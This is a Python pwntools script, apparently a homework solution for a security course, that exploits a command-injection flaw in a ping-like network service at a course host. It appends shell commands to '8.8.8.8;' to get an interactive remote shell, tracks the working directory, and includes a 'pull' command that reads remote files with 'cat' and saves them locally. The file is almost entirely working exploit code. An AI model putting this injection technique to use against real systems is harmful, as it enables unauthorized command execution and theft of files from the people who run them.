"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
from pwn import *
context.log_level = 'error'

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here
b = True
pwd = '.'

def show_help():
    print("""    shell Drop into an interactive shell and allow users to gracefully exit
    pull <remote-path> <local-path> Download files
    help Shows this help menu
    quit Quit the shell""")

def execute_cmd():
    global b, pwd
    r = remote(host, port)
    r.recvuntil(': ')
    #if b:
    #    print(data.decode('utf-8'))
    #    b = False
    cmd = raw_input(">> ").strip()
    if cmd == "exit":
        return
    to_send = "8.8.8.8; cd " + pwd + "; " + cmd + "; echo '~~'; pwd; echo '~~'"
    #print(to_send)
    r.sendline(to_send.encode())   # Send a newline \n at the end of your command
    resp = r.recvuntil(' ~~ ')[300:-4]
    print(resp)
    pwd = r.recvuntil(' ~~')[:-3]
    execute_cmd()


def pull(cmd):
    args = cmd.split(" ")
    if len(args) != 3:
        show_help()
        return
    r = remote(host, port)
    r.recvuntil(': ')
    rem = args[1]
    local = args[2]
    to_send = "8.8.8.8; cat " + rem
    r.sendline(to_send)
    resp = r.recvall()[300:]
    print(resp)
    with open(local, 'wb+') as localfile:
        localfile.write(resp)


if __name__ == '__main__':
    while True:
        command = raw_input("> ").strip()
        if command == "shell":
            execute_cmd()
        elif command == "quit":
            exit()
        elif command == "help":
            show_help()
        elif command[:4] == "pull":
            pull(command)
        else:
            show_help()

